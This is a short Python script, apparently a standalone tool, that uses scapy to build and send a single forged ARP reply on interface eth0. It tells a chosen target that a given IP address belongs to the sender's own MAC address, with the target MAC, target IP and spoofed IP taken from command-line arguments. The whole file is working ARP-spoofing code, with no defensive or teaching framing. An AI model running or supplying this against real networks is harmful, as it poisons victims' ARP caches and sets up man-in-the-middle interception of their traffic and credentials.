import sys
import scapy.all

DEFAULT_INTERFACE = 'eth0'


class ArpSpoofer:
    def __init__(self, dst_mac, dst_addr, who_has_addr):
        self.dst_mac = dst_mac
        self.src_mac = scapy.all.get_if_hwaddr(DEFAULT_INTERFACE)
        self.dst_addr = dst_addr
        self.who_has_addr = who_has_addr
    
    def spoof_arp_response(self):
        print('Sending ARP response packet')
        scapy.all.sendp(self._packet(), iface=DEFAULT_INTERFACE)
        print('ARP reponse sent')

    def _packet(self):
        return self._eth() / self._arp()

    def _eth(self):
        return scapy.all.Ether(dst=self.dst_mac, src=self.src_mac, type=0x806)

    def _arp(self):
        return scapy.all.ARP(op=2, hwdst=self.dst_mac, hwsrc=self.src_mac, pdst=self.dst_addr, psrc=self.who_has_addr)

if __name__ == '__main__':
    dst_mac = sys.argv[1]
    dst_addr = sys.argv[2]
    who_has_addr = sys.argv[3]
    mock = ArpSpoofer(dst_mac, dst_addr, who_has_addr)

    mock.spoof_arp_response()
